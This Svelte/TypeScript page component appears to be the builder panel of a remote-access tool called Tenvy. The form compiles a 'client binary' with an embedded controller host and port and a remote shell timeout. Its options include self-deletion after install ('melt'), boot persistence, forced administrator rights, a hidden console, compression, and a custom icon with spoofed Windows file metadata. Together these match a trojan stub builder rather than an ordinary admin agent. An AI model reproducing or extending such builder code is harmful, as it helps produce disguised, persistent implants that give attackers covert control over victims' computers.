<script lang="ts">
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardFooter,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Progress } from '$lib/components/ui/progress/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { TriangleAlert, CircleCheck, Info } from '@lucide/svelte';
	import { onDestroy } from 'svelte';

	type BuildStatus = 'idle' | 'running' | 'success' | 'error';

	type BuildResponse = {
		success: boolean;
		message?: string;
		downloadUrl?: string;
		outputPath?: string;
		log?: string[];
		sharedSecret?: string;
		warnings?: string[];
	};

	let host = $state('localhost');
	let port = $state('2332');
	type TargetOS = 'windows' | 'linux' | 'darwin';
	type TargetArch = 'amd64' | '386' | 'arm64';

	const targetOsOptions: { value: TargetOS; label: string }[] = [
		{ value: 'windows', label: 'Windows' },
		{ value: 'linux', label: 'Linux' },
		{ value: 'darwin', label: 'macOS' }
	];

	const extensionOptionsByOS: Record<TargetOS, string[]> = {
		windows: ['.exe', '.bat'],
		linux: ['.bin'],
		darwin: ['.bin']
	};

	const architectureOptionsByOS: Record<TargetOS, { value: TargetArch; label: string }[]> = {
		windows: [
			{ value: 'amd64', label: 'x64' },
			{ value: '386', label: 'x86' },
			{ value: 'arm64', label: 'ARM64' }
		],
		linux: [
			{ value: 'amd64', label: 'x64' },
			{ value: 'arm64', label: 'ARM64' }
		],
		darwin: [
			{ value: 'amd64', label: 'Intel (x64)' },
			{ value: 'arm64', label: 'Apple Silicon (ARM64)' }
		]
	};

	let outputFilename = $state('tenvy-client');
	let targetOS = $state<TargetOS>('windows');
	let targetArch = $state<TargetArch>('amd64');
	let outputExtension = $state(extensionOptionsByOS.windows[0]);
	let installationPath = $state('');
	let meltAfterRun = $state(false);
	let startupOnBoot = $state(false);
	let developerMode = $state(true);
	let mutexName = $state('');
	let compressBinary = $state(false);
	let forceAdmin = $state(false);
	let fileIconName = $state<string | null>(null);
	let fileIconData = $state<string | null>(null);
	let fileIconError = $state<string | null>(null);
	let generatedSecret = $state<string | null>(null);
	let secretCopyState = $state<'idle' | 'copied' | 'error'>('idle');
	let secretCopyTimeout: ReturnType<typeof setTimeout> | null = null;
	let buildWarnings = $state<string[]>([]);
	let pollIntervalMs = $state('');
	let maxBackoffMs = $state('');
	let shellTimeoutSeconds = $state('');
	const defaultFileInformation = {
		fileDescription: '',
		productName: '',
		companyName: '',
		productVersion: '',
		fileVersion: '',
		originalFilename: '',
		internalName: '',
		legalCopyright: ''
	} as const;
	let fileInformation = $state({ ...defaultFileInformation });

	const isWindowsTarget = $derived(targetOS === 'windows');

	let buildStatus = $state<BuildStatus>('idle');
	let buildProgress = $state(0);
	let buildError = $state<string | null>(null);
	let downloadUrl = $state<string | null>(null);
	let outputPath = $state<string | null>(null);
	let buildLog = $state<string[]>([]);

	let progressMessages = $state<{ id: number; text: string; tone: 'info' | 'success' | 'error' }[]>(
		[]
	);
	let nextMessageId = $state(0);

	let isBuilding = $derived(buildStatus === 'running');

	$effect(() => {
		const allowedExtensions = extensionOptionsByOS[targetOS] ?? extensionOptionsByOS.windows;
		if (!allowedExtensions.includes(outputExtension)) {
			outputExtension = allowedExtensions[0];
		}
	});

	$effect(() => {
		const archOptions = architectureOptionsByOS[targetOS] ?? architectureOptionsByOS.windows;
		if (!archOptions.some((option) => option.value === targetArch)) {
			targetArch = archOptions[0]?.value ?? 'amd64';
		}
	});

	$effect(() => {
		if (!isWindowsTarget) {
			fileIconName = null;
			fileIconData = null;
			fileIconError = null;
			fileInformation = { ...defaultFileInformation };
		}
	});

	function resetProgress() {
		buildStatus = 'idle';
		buildProgress = 0;
		buildError = null;
		downloadUrl = null;
		outputPath = null;
		buildLog = [];
		progressMessages = [];
		generatedSecret = null;
		buildWarnings = [];
		fileIconError = null;
		secretCopyState = 'idle';
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
			secretCopyTimeout = null;
		}
	}

	function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
		progressMessages = [
			...progressMessages,
			{
				id: nextMessageId++,
				text,
				tone
			}
		];
	}

	function sanitizeFileInformation() {
		const entries = Object.entries(fileInformation).map(([key, value]) => [key, value.trim()]);
		return Object.fromEntries(entries.filter(([, value]) => value !== ''));
	}

	async function handleIconSelection(event: Event) {
		const input = event.target as HTMLInputElement;
		const file = input.files?.[0] ?? null;
		fileIconError = null;

		if (!file) {
			fileIconName = null;
			fileIconData = null;
			return;
		}

		if (file.size > 512 * 1024) {
			fileIconError = 'Icon file must be 512KB or smaller.';
			fileIconName = null;
			fileIconData = null;
			return;
		}

		try {
			const buffer = await file.arrayBuffer();
			const bytes = new Uint8Array(buffer);
			let binary = '';
			for (const byte of bytes) {
				binary += String.fromCharCode(byte);
			}
			fileIconData = btoa(binary);
			fileIconName = file.name;
		} catch (err) {
			fileIconError = err instanceof Error ? err.message : 'Failed to read icon file.';
			fileIconName = null;
			fileIconData = null;
		}
	}

	function clearIconSelection() {
		fileIconName = null;
		fileIconData = null;
		fileIconError = null;
	}

	async function buildAgent() {
		if (buildStatus === 'running') {
			return;
		}

		resetProgress();

		const trimmedHost = host.trim();
		const trimmedPort = port.trim();
		const trimmedPollInterval = pollIntervalMs.trim();
		const trimmedMaxBackoff = maxBackoffMs.trim();
		const trimmedShellTimeout = shellTimeoutSeconds.trim();

		if (!trimmedHost) {
			buildError = 'Host is required.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}
		if (trimmedPort && !/^\d+$/.test(trimmedPort)) {
			buildError = 'Port must be numeric.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}
		if (trimmedPollInterval) {
			const pollValue = Number(trimmedPollInterval);
			if (!Number.isFinite(pollValue) || pollValue < 1000 || pollValue > 3_600_000) {
				buildError = 'Poll interval must be between 1,000 and 3,600,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}
		if (trimmedMaxBackoff) {
			const backoffValue = Number(trimmedMaxBackoff);
			if (!Number.isFinite(backoffValue) || backoffValue < 1000 || backoffValue > 86_400_000) {
				buildError = 'Max backoff must be between 1,000 and 86,400,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}
		if (trimmedShellTimeout) {
			const timeoutValue = Number(trimmedShellTimeout);
			if (!Number.isFinite(timeoutValue) || timeoutValue < 5 || timeoutValue > 7_200) {
				buildError = 'Shell timeout must be between 5 and 7,200 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}

		buildStatus = 'running';
		buildProgress = 5;
		pushProgress('Preparing build request...');

		const payload: Record<string, unknown> = {
			host: trimmedHost,
			port: trimmedPort || '2332',
			outputFilename: outputFilename.trim() || 'tenvy-client',
			outputExtension,
			targetOS,
			targetArch,
			installationPath: installationPath.trim(),
			meltAfterRun,
			startupOnBoot,
			developerMode,
			mutexName: mutexName.trim(),
			compressBinary,
			forceAdmin
		};

		if (trimmedPollInterval) {
			payload.pollIntervalMs = trimmedPollInterval;
		}
		if (trimmedMaxBackoff) {
			payload.maxBackoffMs = trimmedMaxBackoff;
		}
		if (trimmedShellTimeout) {
			payload.shellTimeoutSeconds = trimmedShellTimeout;
		}
		if (isWindowsTarget && fileIconData) {
			payload.fileIcon = {
				name: fileIconName,
				data: fileIconData
			};
		}

		const info = sanitizeFileInformation();
		if (isWindowsTarget && Object.keys(info).length > 0) {
			payload.fileInformation = info;
		}

		try {
			pushProgress('Dispatching build to compiler environment...');
			buildProgress = 20;
			const response = await fetch('/api/build', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});

			const result = (await response.json()) as BuildResponse;
			buildLog = result.log ?? [];
			generatedSecret = result.sharedSecret ?? null;
			buildWarnings = result.warnings ?? [];

			if (!response.ok || !result.success) {
				const message = result.message || 'Failed to build agent.';
				throw new Error(message);
			}

			buildProgress = 65;
			pushProgress('Compilation completed. Finalizing artifacts...');

			downloadUrl = result.downloadUrl ?? null;
			outputPath = result.outputPath ?? null;

			buildProgress = 100;
			buildStatus = 'success';
			pushProgress('Agent binary is ready.', 'success');
		} catch (err) {
			buildProgress = 100;
			buildStatus = 'error';
			buildError = err instanceof Error ? err.message : 'Unknown build error.';
			pushProgress(buildError, 'error');
		}
	}

	function messageToneClasses(tone: 'info' | 'success' | 'error') {
		if (tone === 'success') return 'text-emerald-500';
		if (tone === 'error') return 'text-red-500';
		return 'text-muted-foreground';
	}

	function toneIcon(tone: 'info' | 'success' | 'error') {
		if (tone === 'success') return CircleCheck;
		if (tone === 'error') return TriangleAlert;
		return Info;
	}

	function scheduleSecretCopyReset() {
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
		}
		secretCopyTimeout = setTimeout(() => {
			secretCopyState = 'idle';
			secretCopyTimeout = null;
		}, 2000);
	}

	async function copySharedSecret() {
		if (!generatedSecret) {
			return;
		}

		if (typeof navigator === 'undefined' || !navigator.clipboard) {
			secretCopyState = 'error';
			scheduleSecretCopyReset();
			return;
		}

		try {
			await navigator.clipboard.writeText(generatedSecret);
			secretCopyState = 'copied';
		} catch {
			secretCopyState = 'error';
		}

		scheduleSecretCopyReset();
	}

	onDestroy(() => {
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
			secretCopyTimeout = null;
		}
	});
</script>

<div class="mx-auto max-w-4xl">
	<Card>
		<CardHeader>
			<CardTitle>Build agent</CardTitle>
			<CardDescription>
				Configure connection and persistence options, then generate a customized client binary.
			</CardDescription>
		</CardHeader>
		<CardContent class="space-y-8">
			<div class="grid gap-6 md:grid-cols-2">
				<div class="grid gap-2">
					<Label for="host">Host</Label>
					<Input id="host" placeholder="controller.tenvy.local" bind:value={host} />
				</div>
				<div class="grid gap-2">
					<Label for="port">Port</Label>
					<Input id="port" placeholder="2332" bind:value={port} inputmode="numeric" />
				</div>
				<div class="grid gap-2">
					<Label for="output">Output filename</Label>
					<Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
				</div>
				<div class="grid gap-2">
					<Label for="target-os">Target operating system</Label>
					<select
						id="target-os"
						bind:value={targetOS}
						class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
					>
						{#each targetOsOptions as option}
							<option value={option.value}>{option.label}</option>
						{/each}
					</select>
				</div>
				<div class="grid gap-2">
					<Label for="target-arch">Architecture</Label>
					<select
						id="target-arch"
						bind:value={targetArch}
						class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
					>
						{#each architectureOptionsByOS[targetOS] ?? [] as option}
							<option value={option.value}>{option.label}</option>
						{/each}
					</select>
				</div>
				<div class="grid gap-2">
					<Label for="extension">File extension</Label>
					<select
						id="extension"
						bind:value={outputExtension}
						class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
					>
						{#each extensionOptionsByOS[targetOS] ?? [] as option}
							<option value={option}>{option}</option>
						{/each}
					</select>
				</div>
				<div class="grid gap-2">
					<Label for="path">Installation path</Label>
					<Input id="path" placeholder="/usr/local/bin/tenvy" bind:value={installationPath} />
				</div>
				<div class="grid gap-2 md:col-span-2">
					<Label for="mutex">Mutex name</Label>
					<Input
						id="mutex"
						placeholder="Ensures only a single instance can run"
						bind:value={mutexName}
					/>
					<p class="text-xs text-muted-foreground">
						Optional. Leave blank to allow multiple instances. Unsupported characters are replaced
						automatically.
					</p>
				</div>
			</div>

			<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
				<div
					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
				>
					<div>
						<p class="text-sm font-medium">Melt after run</p>
						<p class="text-xs text-muted-foreground">
							Remove the staging binary after installation completes.
						</p>
					</div>
					<Switch
						bind:checked={meltAfterRun}
						aria-label="Toggle whether the temporary binary deletes itself"
					/>
				</div>
				<div
					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
				>
					<div>
						<p class="text-sm font-medium">Startup on boot</p>
						<p class="text-xs text-muted-foreground">
							Persist the agent path so it can be launched automatically on boot.
						</p>
					</div>
					<Switch bind:checked={startupOnBoot} aria-label="Toggle startup persistence preference" />
				</div>
				<div
					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
				>
					<div>
						<p class="text-sm font-medium">Developer mode</p>
						<p class="text-xs text-muted-foreground">
							Keep the console window visible to surface runtime logs and errors.
						</p>
					</div>
					<Switch
						bind:checked={developerMode}
						aria-label="Toggle developer mode console visibility"
					/>
				</div>
				<div
					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
				>
					<div>
						<p class="text-sm font-medium">Binary compression</p>
						<p class="text-xs text-muted-foreground">
							Strip debug symbols and compress the executable when possible.
						</p>
					</div>
					<Switch bind:checked={compressBinary} aria-label="Toggle binary compression" />
				</div>
				<div
					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
				>
					<div>
						<p class="text-sm font-medium">Require administrator</p>
						<p class="text-xs text-muted-foreground">
							Abort launch unless elevated privileges are detected at runtime.
						</p>
					</div>
					<Switch bind:checked={forceAdmin} aria-label="Toggle administrator requirement" />
				</div>
			</div>

			<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
				<div class="grid gap-2">
					<Label for="poll-interval">Poll interval (ms)</Label>
					<Input
						id="poll-interval"
						placeholder="5000"
						bind:value={pollIntervalMs}
						inputmode="numeric"
					/>
					<p class="text-xs text-muted-foreground">
						Leave blank to inherit the server-provided interval. Minimum 1 second.
					</p>
				</div>
				<div class="grid gap-2">
					<Label for="max-backoff">Max backoff (ms)</Label>
					<Input
						id="max-backoff"
						placeholder="30000"
						bind:value={maxBackoffMs}
						inputmode="numeric"
					/>
					<p class="text-xs text-muted-foreground">
						Controls the retry ceiling when reconnecting. Leave blank to use defaults.
					</p>
				</div>
				<div class="grid gap-2">
					<Label for="shell-timeout">Shell timeout (s)</Label>
					<Input
						id="shell-timeout"
						placeholder="30"
						bind:value={shellTimeoutSeconds}
						inputmode="numeric"
					/>
					<p class="text-xs text-muted-foreground">
						Applies to remote shell commands without explicit overrides.
					</p>
				</div>
			</div>

			{#if isWindowsTarget}
				<div class="space-y-6">
					<div class="space-y-3">
						<Label for="file-icon">Executable icon</Label>
						<div class="flex flex-col gap-3 rounded-lg border border-dashed border-border/60 p-4">
							<input
								id="file-icon"
								type="file"
								accept=".ico"
								class="text-xs"
								onchange={handleIconSelection}
							/>
							{#if fileIconName}
								<div
									class="flex items-center justify-between rounded-md bg-muted/40 px-3 py-2 text-xs"
								>
									<span class="font-medium">{fileIconName}</span>
									<button type="button" class="text-primary underline" onclick={clearIconSelection}>
										Remove
									</button>
								</div>
							{/if}
							{#if fileIconError}
								<p class="text-xs text-red-500">{fileIconError}</p>
							{/if}
							<p class="text-xs text-muted-foreground">
								Optional. Accepted format: .ico (max 512KB). Only applied to Windows builds.
							</p>
						</div>
					</div>

					<div class="space-y-3">
						<div>
							<h3 class="text-sm font-semibold">File information</h3>
							<p class="text-xs text-muted-foreground">
								Populate Windows version metadata for the compiled binary.
							</p>
						</div>
						<div class="grid gap-4 md:grid-cols-2">
							<div class="grid gap-2">
								<Label for="file-description">File description</Label>
								<Input
									id="file-description"
									placeholder="Background client"
									bind:value={fileInformation.fileDescription}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="product-name">Product name</Label>
								<Input
									id="product-name"
									placeholder="Tenvy Agent"
									bind:value={fileInformation.productName}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="company-name">Company name</Label>
								<Input
									id="company-name"
									placeholder="Tenvy Operators"
									bind:value={fileInformation.companyName}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="product-version">Product version</Label>
								<Input
									id="product-version"
									placeholder="1.0.0.0"
									bind:value={fileInformation.productVersion}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="file-version">File version</Label>
								<Input
									id="file-version"
									placeholder="1.0.0.0"
									bind:value={fileInformation.fileVersion}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="original-filename">Original filename</Label>
								<Input
									id="original-filename"
									placeholder="tenvy-client.exe"
									bind:value={fileInformation.originalFilename}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="internal-name">Internal name</Label>
								<Input
									id="internal-name"
									placeholder="tenvy-client"
									bind:value={fileInformation.internalName}
								/>
							</div>
							<div class="grid gap-2">
								<Label for="legal-copyright">Legal copyright</Label>
								<Input
									id="legal-copyright"
									placeholder="© 2025 Tenvy"
									bind:value={fileInformation.legalCopyright}
								/>
							</div>
						</div>
					</div>
				</div>
			{/if}

			{#if buildStatus !== 'idle'}
				<div class="space-y-4 rounded-lg border border-dashed border-border/70 p-4">
					<div class="space-y-2">
						<div class="flex items-center justify-between text-sm">
							<span class="font-medium">Build progress</span>
							<span>{buildProgress}%</span>
						</div>
						<Progress value={buildProgress} max={100} class="h-2" />
					</div>
					<ul class="space-y-2 text-sm">
						{#each progressMessages as message (message.id)}
							{#if message}
								{@const Icon = toneIcon(message.tone)}
								<li class={`flex items-start gap-2 ${messageToneClasses(message.tone)}`}>
									<Icon class="mt-0.5 h-4 w-4" />
									<span class="text-left">{message.text}</span>
								</li>
							{/if}
						{/each}
					</ul>
					{#if downloadUrl || outputPath}
						<div class="rounded-md bg-muted/50 p-3 text-xs">
							{#if downloadUrl}
								<p>
									Download: <a
										class="font-medium text-primary underline"
										href={downloadUrl}
										download>agent binary</a
									>
								</p>
							{/if}
							{#if outputPath}
								<p class="mt-1 break-words text-muted-foreground">Saved to {outputPath}</p>
							{/if}
						</div>
					{/if}
					{#if buildLog.length}
						<div>
							<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
								Build log
							</p>
							<pre class="mt-2 max-h-48 overflow-auto rounded-md bg-muted/40 p-3 font-mono text-xs">
                                                                {buildLog.join('\n')}
                                                        </pre>
						</div>
					{/if}
					{#if generatedSecret}
						<div class="rounded-md border border-border/70 bg-muted/30 p-3 text-xs">
							<p class="font-semibold text-muted-foreground">Generated shared secret</p>
							<p class="mt-1 font-mono text-sm">{generatedSecret}</p>
							<p class="mt-1 text-xs text-muted-foreground">
								Store this value securely. It is embedded in the binary and required for agent
								authentication.
							</p>
							<div class="mt-2 flex flex-wrap items-center gap-2 text-xs">
								<Button type="button" variant="outline" size="sm" onclick={copySharedSecret}>
									{secretCopyState === 'copied' ? 'Copied' : 'Copy secret'}
								</Button>
								{#if secretCopyState === 'error'}
									<span class="text-red-500">Copy failed</span>
								{/if}
								{#if secretCopyState === 'copied'}
									<span class="text-emerald-600">Secret copied to clipboard</span>
								{/if}
							</div>
						</div>
					{/if}
					{#if buildWarnings.length}
						<div class="rounded-md border border-amber-500/60 bg-amber-500/10 p-3 text-xs">
							<p class="font-semibold text-amber-600">Warnings</p>
							<ul class="mt-1 space-y-1">
								{#each buildWarnings as warning}
									<li>{warning}</li>
								{/each}
							</ul>
						</div>
					{/if}
				</div>
			{/if}
		</CardContent>
		<CardFooter class="justify-between gap-4">
			<div class="text-xs text-muted-foreground">
				Provide a host and port to embed defaults inside the generated binary. Additional
				preferences are stored for the agent to consume on first launch.
			</div>
			<Button type="button" disabled={isBuilding} onclick={buildAgent}>
				{isBuilding ? 'Building…' : 'Build Agent'}
			</Button>
		</CardFooter>
	</Card>
</div>
